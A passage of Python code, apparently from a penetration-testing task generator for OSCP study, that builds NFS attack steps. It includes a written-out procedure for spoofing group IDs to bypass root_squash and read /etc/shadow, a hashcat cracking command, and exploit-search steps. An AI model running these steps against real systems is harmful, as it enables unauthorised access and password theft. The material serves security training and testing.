                'notes': 'Advanced attack requiring nfs_analyze tool: https://github.com/hvs-consulting/nfs-security-tooling. Details: https://www.hvs-consulting.de/en/nfs-security-identifying-and-exploiting-misconfigurations/. subtree_check disabled by default on Linux. Requires exported directory to be subfolder of larger filesystem (e.g., /srv export on / filesystem allows accessing /var, /home, etc.)',
                'time_estimate': '10-20 minutes'
            }
        })

        # TASK 10: Group-based File Access
        tasks['children'].append({
            'id': f'group-based-access-{port}',
            'name': 'Exploit Group-based Permissions',
            'type': 'manual',
            'metadata': {
                'command': f'# Target: Files owned by root but with non-zero GID\n# Example: /etc/shadow (root:shadow, GID 42 on Debian)\n\n# 1. Identify target files with interesting groups\nfind /mnt/nfs_{target.replace(".", "_")} -user root ! -group root -ls\n\n# 2. Note the GID (e.g., 42 for shadow group)\nls -ln /mnt/nfs_*/etc/shadow\n# Output: -rw-r----- 1 0 42 ... /mnt/nfs_*/etc/shadow\n\n# 3. Create local user with matching GID\nsudo groupadd -g 42 shadow_group\nsudo useradd -u 1500 -G shadow_group nfsuser\n\n# 4. Access file as that user\nsudo su - nfsuser\ncat /mnt/nfs_*/etc/shadow  # Success! Read shadow file',
                'description': 'Bypass root_squash by exploiting group-based permissions on root-owned files',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                'flag_explanations': {
                    '-user root': 'Find files owned by root',
                    '! -group root': 'Exclude files in root group (GID 0)',
                    '-ln': 'List with numeric IDs',
                    'groupadd -g': 'Create group with specific GID',
                    'useradd -G': 'Add user to supplementary group'
                },
                'success_indicators': [
                    'Root-owned files with non-zero GIDs found',
                    'Local user created with matching GID',
                    'Previously inaccessible files now readable',
                    '/etc/shadow readable (password hashes obtained)'
                ],
                'failure_indicators': [
                    'All root files use GID 0 (fully protected)',
                    'Group permissions are restrictive (no read)',
                    'Cannot create local groups (need root on attacker machine)'
                ],
                'next_steps': [
                    'If /etc/shadow accessible: Extract password hashes',
                    'Crack hashes with hashcat/john: hashcat -m 1800 hashes.txt wordlist.txt',
                    'Look for other group-readable sensitive files',
                    'Target common groups: adm (logs), disk (raw disk), shadow (passwords)'
                ],
                'alternatives': [
                    'Standard UID impersonation (if non-root files)',
                    'no_root_squash exploitation (if available)',
                    'fuse_nfs tool with GID spoofing'
                ],
                'notes': 'CRITICAL INSIGHT: root_squash only protects UID 0, NOT GID 0. Files like /etc/shadow are often root:shadow (UID 0, GID 42). By matching the GID, you bypass root_squash. Common Debian/Ubuntu GIDs: shadow=42, adm=4, disk=6. This technique works even with default root_squash enabled.',
                'time_estimate': '5-10 minutes'
            }
        })

        # TASK 11: Version-Specific Vulnerabilities
        if version:
            exploits_task = {
                'id': f'nfs-version-exploits-{port}',
                'name': f'NFS Version-Specific Exploits: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-nfs-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit nfs {version}',
                            'description': 'Search ExploitDB for known NFS vulnerabilities',
                            'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                            'flag_explanations': {
                                'searchsploit': 'Local ExploitDB search tool',
                                'nfs': 'Search term for NFS-related exploits',
                                'version': 'Specific version number'
                            },
                            'success_indicators': [
                                'Exploits found matching version',
                                'PoC scripts available',
                                'Remote code execution exploits listed'
                            ],
                            'failure_indicators': [
                                'No exploits found for this version',
                                'Exploits outdated or irrelevant'
                            ],
                            'next_steps': [
                                'Review exploit details: searchsploit -x <EDB-ID>',
                                'Download exploit: searchsploit -m <EDB-ID>',
                                'Test exploit in controlled manner',
                                'Verify exploit prerequisites (auth, specific config)'
                            ],
                            'alternatives': [
                                'Google: "NFS {version} exploit"',
                                'CVE databases: cve.mitre.org, nvd.nist.gov',
                                'GitHub: search for PoC code'
                            ],
                            'notes': 'NFS exploits are relatively rare. Most NFS attacks exploit misconfigurations (no_root_squash, UID/GID trust) rather than version-specific vulnerabilities.',
                            'time_estimate': '2-3 minutes'
                        }
                    },
                    {
                        'id': f'cve-lookup-nfs-{port}',
                        'name': f'CVE Lookup: NFS {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'# Online CVE lookup\n# Visit: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nfs+{version}\n# Or: https://nvd.nist.gov/vuln/search/results?query=nfs+{version}',
                            'description': 'Search CVE databases for NFS version vulnerabilities',
                            'tags': ['RESEARCH', 'OSCP:LOW'],
                            'success_indicators': [
                                'CVEs found for version',
                                'Severity scores indicate exploitability',
                                'PoC or exploit code available'
                            ],
                            'failure_indicators': [
                                'No CVEs for this specific version',
                                'CVEs are low severity (DoS only)'
                            ],
                            'next_steps': [
                                'Read CVE details and prerequisites',
                                'Search for exploit code (GitHub, ExploitDB)',
                                'Verify target is vulnerable (config, patch level)',
                                'Test exploit if applicable'
                            ],
                            'alternatives': [
                                'searchsploit nfs',
                                'Metasploit: search nfs',
                                'Google Scholar for vulnerability research'
                            ],
                            'notes': 'Most NFS security issues are misconfigurations, not CVE-worthy bugs. Focus on configuration exploitation (no_root_squash, UID/GID) before CVE hunting.',
                            'time_estimate': '5-10 minutes'
                        }
                    }
                ]
            }
            tasks['children'].append(exploits_task)

        # TASK 12: Config File Research
        tasks['children'].append({
            'id': f'config-file-research-{port}',
            'name': 'NFS Configuration File Analysis',
            'type': 'manual',
            'metadata': {
                'command': '# If you obtain shell access on target, check NFS configuration:\ncat /etc/exports\ncat /etc/lib/nfs/etab\n\n# Look for dangerous settings:\n# - no_root_squash (CRITICAL)\n# - rw (write access)\n# - no_all_squash (UID/GID preserved)\n# - insecure (ports >1024 allowed)\n# - nohide (nested filesystems visible)',
                'description': 'Analyze NFS server configuration for security misconfigurations',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT'],
                'flag_explanations': {
                    '/etc/exports': 'Primary NFS export configuration file',
                    '/etc/lib/nfs/etab': 'Extended NFS export table with runtime options'
                },
                'success_indicators': [
                    'Configuration files readable',
                    'Dangerous options identified (no_root_squash, rw, insecure)',
                    'IP restrictions documented',
                    'Export paths and options cataloged'
                ],
                'failure_indicators': [
                    'No shell access to target',
                    'Permission denied reading config files',
                    'NFS not configured (files empty)'
                ],
                'next_steps': [
                    'Document all dangerous settings for exploitation',
                    'If no_root_squash: Execute SUID privilege escalation',
                    'If rw: Test file upload capabilities',
                    'If IP restrictions: Note allowed client IPs for pivoting'
                ],
                'alternatives': [
                    'Remote detection via nfs_analyze tool',
                    'Infer configuration from testing (UID tests, write tests)',
                    'showmount output may reveal some options'
                ],
                'notes': 'Dangerous NFS export settings from HackTricks: (1) rw - read/write, (2) insecure - ports >1024, (3) nohide - nested FS visible, (4) no_root_squash - root not squashed, (5) no_all_squash - all UIDs preserved. This is post-exploitation analysis when you have target shell access.',
                'time_estimate': '2-5 minutes'
            }
        })

        return tasks
